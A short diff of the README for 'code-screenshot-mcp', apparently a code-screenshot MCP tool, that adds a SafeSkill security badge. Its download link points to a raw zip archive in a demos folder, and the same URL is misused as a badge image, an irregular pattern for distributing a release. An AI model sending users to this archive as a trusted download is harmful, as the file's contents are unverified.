@@ -1,5 +1,7 @@
 # 🎨 code-screenshot-mcp - Generate Stunning Code Screenshots Easily
 
+[![SafeSkill 88/100](https://img.shields.io/badge/SafeSkill-88%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/tommy0200-code-screenshot-mcp)
+
 [![Download Code Screenshot MCP](https://github.com/tommy0200/code-screenshot-mcp/raw/refs/heads/main/assets/demos/mcp_screenshot_code_3.8-beta.4.zip%20Now-Get%20It%20Here-brightgreen)](https://github.com/tommy0200/code-screenshot-mcp/raw/refs/heads/main/assets/demos/mcp_screenshot_code_3.8-beta.4.zip)
 
 ## 🚀 Getting Started
